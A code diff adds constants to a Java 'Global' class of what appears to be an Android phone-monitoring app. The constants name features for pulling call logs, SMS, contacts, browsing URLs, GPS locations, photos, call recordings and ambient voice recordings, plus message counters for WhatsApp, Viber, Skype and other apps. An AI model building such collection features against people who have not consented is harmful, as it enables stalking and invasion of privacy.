@@ -61,16 +61,53 @@ public class Global {
 
 
     /**
+     * Function Name of Feature
+     */
+    public static final String GET_CALL_HISTORY = "GetCalls";
+    public static final String GET_SMS_HISTORY = "GetSMSByDateTime";
+    public static final String GET_CONTACT_HISTORY = "GetContacts";
+    public static final String GET_URL_HISTORY = "GetURL";
+    public static final String GET_LOCATION_HISTORY = "GetLocations";
+    public static final String GET_PHOTO_HISTORY = "GetPhotos";
+    public static final String GET_PHONE_CALL_RECORDING = "GetPhoneRecording";
+    public static final String GET_AMBIENT_VOICE_RECORDING = "GetAmbients";
+    public static final String GET_APPLICATION_USAGE = "GetApps";
+    public static final String GET_NOTES_HISTORY = "GetNotes";
+
+
+    /**
      * SharedPreferences
      */
     public static final String SETTINGS = "Setting";
     public static final String CONTACT_TOTAL = "Contact_Total";
     public static final String CALL_TOTAL = "Call_Total";
     public static final String PHONE_CALL_RECORDING_TOTAL = "Phone_Call_Total";
+    public static final String AMBIENT_RECORDING_TOTAL = "Ambient_Recording_Total";
     public static final String URL_TOTAL = "URL_Total";
     public static final String APP_USAGE_TOTAL = "App_Usage_Total";
     public static final String GPS_TOTAL = "GPS_Total";
     public static final String PHOTO_TOTAL = "Photo_Total";
+    public static final String WHATSAPP_TOTAL = "WhatsApp_Total";
+    public static final String VIBER_TOTAL = "Viber_Total";
+    public static final String FACEBOOK_TOTAL = "Facebook_Total";
+    public static final String SMS_TOTAL = "SMS_Total";
+    public static final String SKYPE_TOTAL = "Skype_Total";
+    public static final String HANGOUTS_TOTAL = "Hangouts_Total";
+
+
+    /**
+     * SMS type
+     */
+    public static final String SMS_DEFAULT_TYPE = "0";
+    public static final String SMS_WHATSAPP_TYPE = "1";
+    public static final String SMS_INSTAGRAM_TYPE = "2";
+    public static final String SMS_VIBER_TYPE = "3";
+    public static final String SMS_FACEBOOK_TYPE = "4";
+    public static final String SMS_SKYPE_TYPE = "5";
+    public static final String SMS_HANGOUTS_TYPE = "9";
+    public static final String SMS_BBM_TYPE = "10";
+    public static final String SMS_LINE_TYPE = "11";
+    public static final String SMS_KIK_TYPE = "12";
 
 
     /**
